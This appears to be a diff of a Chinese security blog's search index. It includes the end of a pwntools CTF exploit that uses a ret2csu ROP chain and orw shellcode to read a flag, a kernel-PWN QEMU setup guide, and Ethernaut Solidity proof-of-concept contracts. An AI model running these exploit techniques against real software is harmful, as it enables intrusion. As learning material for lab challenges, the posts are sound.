class="subst">&#123;<span class="built_in">hex</span>(base + <span class="built_in">int</span>(bp, <span class="number">16</span>))&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">list</span>):</span><br><span class="line">                bp = [<span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">hex</span>(base + <span class="built_in">int</span>(b, <span class="number">16</span>))&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bp]</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&quot;\n&quot;</span>.join(bp) <span class="keyword">if</span> bp <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> bp:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">str</span>):</span><br><span class="line">                bp = <span class="string">f&quot;b *<span class="subst">&#123;bp&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">list</span>):</span><br><span class="line">                bp = [<span class="string">f&quot;b *<span class="subst">&#123;b&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bp]</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&quot;\n&quot;</span>.join(bp) <span class="keyword">if</span> bp <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># ----------------predefine area start------------------#</span></span><br><span class="line">elf_name = <span class="string">&quot;/mnt/f/challenges/test/attachment&quot;</span></span><br><span class="line">p = process(elf_name)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = context.binary = ELF(elf_name)</span><br><span class="line">libc_name = <span class="string">&quot;&quot;</span></span><br><span class="line">libc = ELF(libc_name) <span class="keyword">if</span> libc_name <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------predefine area end------------------#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">func, edi, rsi, rdx, ret</span>):</span><br><span class="line">    payload = p64(<span class="number">0x4013AA</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">    payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">    payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(func)  <span class="comment"># func</span></span><br><span class="line">    payload += p64(<span class="number">0x401390</span>) + p64(<span class="number">0</span>) * <span class="number">7</span> + ret</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = <span class="number">0x600000</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xff\x54\x5e\x0f\x05\xc3&quot;</span></span><br><span class="line"><span class="comment"># debug(pie=0, bp=[&#x27;0x4012fc&#x27;])</span></span><br><span class="line">sda(<span class="string">&quot;can do?&quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd(</span><br><span class="line">    csu(</span><br><span class="line">        elf.got.mprotect,</span><br><span class="line">        base,</span><br><span class="line">        <span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">7</span>,  <span class="comment"># mprotect(base, 0x1000, 7)</span></span><br><span class="line">        csu(elf.got.read, <span class="number">0</span>, base, <span class="number">0x1000</span>, p64(base)),  <span class="comment"># read(0, base, 0x1000)</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">orw = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">sd(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>seccomp</tag>
+        <tag>sandbox</tag>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kernel PWN——内核编译以及模拟</title>
+    <url>/2025/02/19/Kernel-PWN%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%8B%9F/</url>
+    <content><![CDATA[<h1>编译</h1>
+<p>内核版本下载，这里随便选一个LTS版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br></pre></td></tr></table></figure>
+<p>下载完解压进入对应的目录来配置一些选项</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.4.98/</span><br><span class="line">make menuconfig <span class="comment"># Kernel hacking -&gt; Compile-time checks and compiler options -&gt; [*]Compile the kernel with debug info</span></span><br><span class="line">make -j3 bzImage</span><br></pre></td></tr></table></figure>
+<p>编译好后会显示如下信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>
+<p>编译便到此结束</p>
+<h1>QEMU模拟</h1>
+<p>这里首先需要安装busybox来模拟文件系统</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br></pre></td></tr></table></figure>
+<p>然后进行配置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="comment"># Setttings -&gt; [*] Build static binary (no shared libs)</span></span><br><span class="line"><span class="comment"># Linux System Utilities -&gt; [] Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</span></span><br><span class="line"><span class="comment"># Networking Utilities -&gt; [] inetd</span></span><br></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br></pre></td></tr></table></figure>
+<p>创建<code>_install</code>目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p><font style="color:rgba(0, 0, 0, 0.87);">在 </font><code>_install</code><font style="color:rgba(0, 0, 0, 0.87);"> 目录下创建以下文件夹</font></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
+<p>创建<code>init</code>启动脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
+<p>随后在该目录下打包文件系统</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment"># 打包的文件系统在上一级目录下</span></span><br></pre></td></tr></table></figure>
+<h1>启动！</h1>
+<p>启动脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-28.png" alt="upload successful"></p>
+]]></content>
       <categories>
         <category>学习</category>
       </categories>
       <tags>
-        <tag>PyQT</tag>
+        <tag>Kernel PWN</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>llvm学习（2）</title>
-    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/</url>
-    <content><![CDATA[<h1>LLVM Pass学习（2）</h1>
-]]></content>
   </entry>
   <entry>
     <title>llvm学习（1）</title>
@@ -467,6 +461,12 @@ LLVM 提供不同的优化级别（如 <code>-O1</code>、<code>-O2</code>、<co
       </tags>
   </entry>
   <entry>
+    <title>llvm学习（2）</title>
+    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/</url>
+    <content><![CDATA[<h1>LLVM Pass学习（2）</h1>
+]]></content>
+  </entry>
+  <entry>
     <title>国城杯2024 PWN WP</title>
     <url>/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-WP/</url>
     <content><![CDATA[<h1>国城杯2024 PWN WP</h1>
@@ -506,56 +506,6 @@ LLVM 提供不同的优化级别（如 <code>-O1</code>、<code>-O2</code>、<co
       <tags>
         <tag>wp</tag>
         <tag>国城杯</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>区块链安全入门#2</title>
-    <url>/2025/02/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-2/</url>
-    <content><![CDATA[<h2 id="jfoUX">Ethernaut靶场</h2>
-<h3 id="w0Ihj">level4</h3>
-<p><strong>关键知识点：</strong><code>tx.origin</code>和<code>msg.sender</code>的区别</p>
-<blockquote>
-<h2 id="txorigin-vs-msgsender"><font style="color:rgba(0, 0, 0, 0.87);">tx.origin vs msg.sender</font>[¶](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)</h2>
-<ul class="lvl-1">
-<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">这里区分一下 tx.origin 和 msg.sender ，msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 tx.origin 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</font></li>
-<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">给定这样一个场景如：用户通过合约 A 调合约 B，此时：</font>
-<ul class="lvl-3">
-<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 A : tx.origin 和 msg.sender 都是用户</font></li>
-<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 B : tx.origin 是用户，msg.sender 是合约 A</font></li>
-</ul>
-</li>
-</ul>
-<p><font style="color:rgba(0, 0, 0, 0.87);">                                                             ——CTF-WIKI</font></p>
-</blockquote>
-<h4 id="C2kEY">POC</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  Telephone pubclic target = Telephone(&#x27;账户地址&#x27;);</span><br><span class="line">  function pwn() public&#123;</span><br><span class="line">    target.changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="lTz9G">level5</h3>
-<p>**关键知识点：**溢出攻击</p>
-<h4 id="cqWqf">POC</h4>
-<p>版本0.6，存在下界溢出且无溢出保护，直接转21使得banlances=-1即可</p>
-<h3 id="quy5G">level6</h3>
-<p>**关键知识点：**委托调用</p>
-<p>委托调用就相当于把另一个函数的的代码照抄照搬过来然后调用</p>
-<h4 id="ugyxx">POC</h4>
-<p>msg.data填为pwn函数地址即可</p>
-<h3 id="dxFLn">level7</h3>
-<p>**关键知识点：**自毁合约——<code>selfdestruct</code></p>
-<h4 id="V6lNY">POC</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  function pwn(address _target) payable public &#123;</span><br><span class="line">    selfdestruct(payable(_target));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="eYpDx">level8</h3>
-<p><strong>关键知识点：<strong>区块链特性——记录</strong>公开透明</strong></p>
-<h4 id="D5TNf">POC</h4>
-<p>翻转账记录，因为在区块链浏览器上所有数据都是公开透明的</p>
-<h2 id="JrJRU">重入攻击</h2>
-<p>我对重入攻击的理解是回调函数中断条件一直不被满足而导致的函数重复不断的调用</p>
-<p>CTF-WIKI上的解释：</p>
-<p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">Re-Entrancy - CTF Wiki</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>区块链安全</tag>
       </tags>
   </entry>
   <entry>
@@ -619,6 +569,56 @@ LLVM 提供不同的优化级别（如 <code>-O1</code>、<code>-O2</code>、<co
 <p><code>block.number</code>和<code>FACTOR</code>均为已知值</p>
 <h3 id="PoC-2">PoC</h3>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PoC&#123;</span><br><span class="line">    CoinFlip public target;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _guess() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>区块链安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区块链安全入门#2</title>
+    <url>/2025/02/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-2/</url>
+    <content><![CDATA[<h2 id="jfoUX">Ethernaut靶场</h2>
+<h3 id="w0Ihj">level4</h3>
+<p><strong>关键知识点：</strong><code>tx.origin</code>和<code>msg.sender</code>的区别</p>
+<blockquote>
+<h2 id="txorigin-vs-msgsender"><font style="color:rgba(0, 0, 0, 0.87);">tx.origin vs msg.sender</font>[¶](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)</h2>
+<ul class="lvl-1">
+<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">这里区分一下 tx.origin 和 msg.sender ，msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 tx.origin 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</font></li>
+<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">给定这样一个场景如：用户通过合约 A 调合约 B，此时：</font>
+<ul class="lvl-3">
+<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 A : tx.origin 和 msg.sender 都是用户</font></li>
+<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 B : tx.origin 是用户，msg.sender 是合约 A</font></li>
+</ul>
+</li>
+</ul>
+<p><font style="color:rgba(0, 0, 0, 0.87);">                                                             ——CTF-WIKI</font></p>
+</blockquote>
+<h4 id="C2kEY">POC</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  Telephone pubclic target = Telephone(&#x27;账户地址&#x27;);</span><br><span class="line">  function pwn() public&#123;</span><br><span class="line">    target.changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="lTz9G">level5</h3>
+<p>**关键知识点：**溢出攻击</p>
+<h4 id="cqWqf">POC</h4>
+<p>版本0.6，存在下界溢出且无溢出保护，直接转21使得banlances=-1即可</p>
+<h3 id="quy5G">level6</h3>
+<p>**关键知识点：**委托调用</p>
+<p>委托调用就相当于把另一个函数的的代码照抄照搬过来然后调用</p>
+<h4 id="ugyxx">POC</h4>
+<p>msg.data填为pwn函数地址即可</p>
+<h3 id="dxFLn">level7</h3>
+<p>**关键知识点：**自毁合约——<code>selfdestruct</code></p>
+<h4 id="V6lNY">POC</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  function pwn(address _target) payable public &#123;</span><br><span class="line">    selfdestruct(payable(_target));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="eYpDx">level8</h3>
+<p><strong>关键知识点：<strong>区块链特性——记录</strong>公开透明</strong></p>
+<h4 id="D5TNf">POC</h4>
+<p>翻转账记录，因为在区块链浏览器上所有数据都是公开透明的</p>
+<h2 id="JrJRU">重入攻击</h2>
+<p>我对重入攻击的理解是回调函数中断条件一直不被满足而导致的函数重复不断的调用</p>
+<p>CTF-WIKI上的解释：</p>
+<p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">Re-Entrancy - CTF Wiki</a></p>
 ]]></content>
       <categories>
         <category>学习</category>
